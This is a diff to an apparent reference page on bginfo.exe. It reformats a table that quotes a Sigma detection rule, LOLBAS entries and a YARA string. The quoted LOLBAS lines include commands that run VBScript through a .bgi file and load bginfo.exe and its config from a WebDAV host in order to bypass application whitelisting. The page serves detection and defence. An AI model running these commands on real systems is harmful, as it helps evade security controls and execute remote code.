@@ -92,21 +92,21 @@ C:\Windows\System32\wow64win.dll |
 
 Source | Source File | Example | License
 -- | -- | -- | --
-[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `title: Application Whitelisting Bypass via Bginfo` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `- https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `- https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `Image\|endswith: '\bginfo.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Name: Bginfo.exe` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: bginfo.exe bginfo.bgi /popup /nolicprompt` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Description: Execute VBscript code that is referenced within the bginfo.bgi file.` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Description: Execute bginfo.exe from a WebDAV server.` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt` | 
-[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/` | 
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `title: Application Whitelisting Bypass via Bginfo`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `- https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `- https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[sigma](https://github.com/Neo23x0/sigma) | [win_susp_bginfo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_bginfo.yml) | `Image\|endswith: '\bginfo.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Name: Bginfo.exe`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: bginfo.exe bginfo.bgi /popup /nolicprompt`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Description: Execute VBscript code that is referenced within the bginfo.bgi file.`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `Description: Execute bginfo.exe from a WebDAV server.`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt`{:.highlight .language-yaml} | 
+[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bginfo.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | `- Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/`{:.highlight .language-yaml} | 
 [signature-base](https://github.com/Neo23x0/signature-base) | [gen_sysinternals_anomaly.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_sysinternals_anomaly.yar) | $nfp2 = "BGInfo - Wallpaper text configurator" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
 
 
 
-MIT License. Copyright (c) 2020 Strontic.
+MIT License. Copyright (c) 2020-2021 Strontic.
 
 
